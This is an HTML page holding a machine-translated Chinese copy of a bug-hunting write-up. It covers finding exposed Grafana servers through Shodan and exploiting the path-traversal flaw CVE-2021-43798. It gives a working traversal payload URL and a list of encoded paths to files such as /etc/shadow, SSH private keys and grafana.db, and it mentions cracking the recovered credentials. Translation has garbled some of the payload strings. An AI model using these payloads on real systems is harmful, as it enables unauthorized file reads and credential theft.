<html>
<head>
<title>From Shodan Dork to Grafana 📊Local File Inclusion</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">从Shodan呆子到Grafana📊本地文件包含</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/from-shodan-dork-to-grafana-local-file-inclusion-e77dc4cfc264?source=collection_archive---------0-----------------------#2022-11-11">https://infosecwriteups.com/from-shodan-dork-to-grafana-local-file-inclusion-e77dc4cfc264?source=collection_archive---------0-----------------------#2022-11-11</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="f0bb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗨读者们📖，这是我在使用shodan recon和进一步开发grafana服务时发现的关于本地文件包含的新文章。</p><p id="ad2a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后，我还将提供一个来自我的youtube频道的视频POC链接，这将有助于您更清楚地理解这一点。</p><p id="d3e5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">让我们开始吧，</strong></p><figure class="kl km kn ko gt kp"><div class="bz fp l di"><div class="kq kr l"/></div></figure><p id="7337" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">对于grafana相关的服务，我使用简单的shodan dork</p><p id="6315" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">"<strong class="jp ir"><em class="ks">title:grafana hostname:target</em></strong>也可以用<strong class="jp ir"><em class="ks">http . title:grafana</em></strong></p><p id="e146" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">结果，我在目标IP上运行了一个grafana服务。</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="ku kv di kw bf kx"><div class="gh gi kt"><img src="../Images/e239837a4073aef6bf34771672b34563.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cGx6HLPqKHCPqctP3YRYdA.png"/></div></div></figure><p id="d112" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可以进一步使用<a class="ae la" href="https://ipinfo.io" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> ipinfo.io </strong> </a>来收集更多与IP地址相关的信息。</p><p id="9f92" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，grafana运行在端口3000上，这是该服务的常用端口，像往常一样，我检查默认凭据，但它们对我不起作用。</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="ku kv di kw bf kx"><div class="gh gi lb"><img src="../Images/ed2741be2fbd98d7c9de2909a60a5d66.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aZSnhkbYR5kXJdnD0zwn9g.png"/></div></div></figure><p id="e9b3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">此外，我发现该服务运行在版本<strong class="jp ir"> v8.0.4 </strong>上，然后我查找该版本的可用CVE，发现该版本容易受到LFI漏洞的攻击。</p><p id="204d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你可以在下面的样本截图底部的细节中查看版本。它是9.2.3，但在我的例子中，版本是8.0.4。</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="ku kv di kw bf kx"><div class="gh gi lc"><img src="../Images/98a713f2de406d9efc7675600fbec969.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RUTQ-5rBuS_eV0p-YLzZ-A.png"/></div></div></figure><p id="f5f2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="ks">注意:LFI漏洞影响Grafana 8.0.0-beta1到8.3.0 </em> </strong></p><p id="d709" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">LFI简介:</p><p id="eb02" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">攻击者可以使用本地文件包含(LFI)来欺骗web应用程序暴露或运行web服务器上的文件。LFI攻击可能导致信息泄露、远程代码执行，甚至跨站点脚本。通常，当应用程序使用文件路径作为输入时，会发生LFI。如果应用程序将此输入视为可信，则可以在include语句中使用本地文件。</p><p id="7801" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="ks">那么，我们来说正题，</em></p><p id="afa7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在它很容易受到<strong class="jp ir">CVE-2021–43798</strong>你可以在<a class="ae la" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43798" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir">https://cve.mitre.org/cgi-bin/cvename.cgi?阅读/查看有关这个CVE的详细信息name = CVE-2021-43798</strong></a><strong class="jp ir">。</strong></p><p id="4691" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">手动，我发现LFI在路径<strong class="jp ir"> /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..插件<strong class="jp ir">警报列表</strong>上的%2fetc/passwd </strong></p><p id="b1a5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">那么完整路径就变成了<strong class="jp ir"> /public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd/ </strong></p><p id="294a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有效负载:<a class="ae la" href="http://target_ip:3000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd/" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir">http://target _ IP:3000/public/plugins/alert list/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd/ </strong> </a></p><p id="79b8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">结果:</strong></p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="ku kv di kw bf kx"><div class="gh gi ld"><img src="../Images/147bc0071d6d0c459728e076f5ab8e30.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qXW_g1a6nr4An5_t1KOFEQ.png"/></div></div></figure><p id="54ea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是可以有很多插件，例如</p><p id="9ef5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">警报列表<br/>公告列表<br/>grafana-azure-monitor-data source<br/>条形图<br/>条形标尺<br/> cloudwatch <br/>仪表盘列表<br/>弹性搜索<br/>标尺<br/>geomap<br/>getting started<br/>堆栈驱动<br/>图形<br/>石墨<br/>热图<br/>直方图</strong></p><p id="75c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">还有更多……</strong></p><p id="dc30" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">此外，除了<strong class="jp ir"> /etc/passwd </strong>之外，还可能有更多的<em class="ks">路径</em>，如果<strong class="jp ir"> /etc/passwd </strong>不工作，我们可能会错过其他敏感信息</p><p id="6468" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">例如:</p><p id="067b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> /..%2f..%2f..%2f..%2f..%2fconf/defaults.ini <br/> /..%2f..%2f..%2f..%2f..%2fconf/grafana.ini <br/> /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..% 2 fetc/grafana/grafana . ini<br/>/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..% 2 fetc/grafana/defaults . ini<br/>/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd <br/> /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/shadow <br/> /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome/grafana/。bash_history <br/> /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome/grafana/。ssh/id_rsa <br/> /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2froot/。bash_history <br/> /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2froot/。ssh/id_rsa <br/> /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..% 2 fusr/local/etc/grafana/grafana . ini<br/>/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..% 2f var/lib/grafana/grafana . db<br/>/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc/net/fib_trie <br/> /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc/net/tcp <br/> /..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fproc/self/cmdline </strong></p><p id="a3ce" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以手动地用各自的插件查找每个案例是一个漫长的过程，所以你可以编写自己的脚本来自动完成这个任务，</p><p id="3c48" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了进一步自动化攻击，我在GitHub <a class="ae la" href="https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798/blob/main/README.md" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir">上使用了一个专门为这个CVE制作的工具https://GitHub . com/Pedro havay/exploit-grafana-CVE-2021-43798</strong></a></p><p id="e321" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如我已经说过的，我们可以在另一个路径中找到更敏感的信息，也可以在<strong class="jp ir"> defaults.ini </strong>路径中找到，此外，我能够在上述工具的帮助下破解凭证，或者，您可以使用其他工具来破解密钥，如hashcat或john the ripper。</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="ku kv di kw bf kx"><div class="gh gi le"><img src="../Images/050ff791971eb152b99897ded1a03bad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*k8956-GTz6hZtgISzU6JPw.png"/></div></div></figure><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="ku kv di kw bf kx"><div class="gh gi lf"><img src="../Images/38908b6f84d5e8d48518c6d356188337.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*e85CyqaxxR2um5DehhI_pA.png"/></div></div></figure><p id="811e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">破解密钥</strong></p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="ku kv di kw bf kx"><div class="gh gi lg"><img src="../Images/a388d9f4d69531e4b89a6d25c161e290.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*j25ylV873svz4Xh5i0xp-w.png"/></div></div></figure><p id="dbf4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这样，漏洞的影响会增加。</p><p id="39f6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">我在下面添加视频概念证明:</strong></p><figure class="kl km kn ko gt kp"><div class="bz fp l di"><div class="lh kr l"/></div></figure><p id="0987" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">感谢您阅读文章</strong>🤩</p><figure class="kl km kn ko gt kp"><div class="bz fp l di"><div class="li kr l"/></div></figure><p id="d811" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">订阅我的youtube频道寻找bug相关的东西:<a class="ae la" href="https://www.youtube.com/channel/UCq7-Qf45etdk0qc35I_n7PQ?sub_confirmation=1" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> redirect _poc </strong> </a></p><p id="a2da" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你可以在Instagram上关注我<strong class="jp ir"> varmaanu001 </strong></p><p id="f5c9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在Linkedin上关注我:<a class="ae la" href="http://linkedin.com/in/anurag-verma-650b771a2" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir">我的_ Linkedin</strong>T3】</a></p></div><div class="ab cl lj lk hu ll" role="separator"><span class="lm bw bk ln lo lp"/><span class="lm bw bk ln lo lp"/><span class="lm bw bk ln lo"/></div><div class="ij ik il im in"><h2 id="da21" class="lq lr iq bd ls lt lu dn lv lw lx dp ly jy lz ma mb kc mc md me kg mf mg mh mi bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae la" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周时事通讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>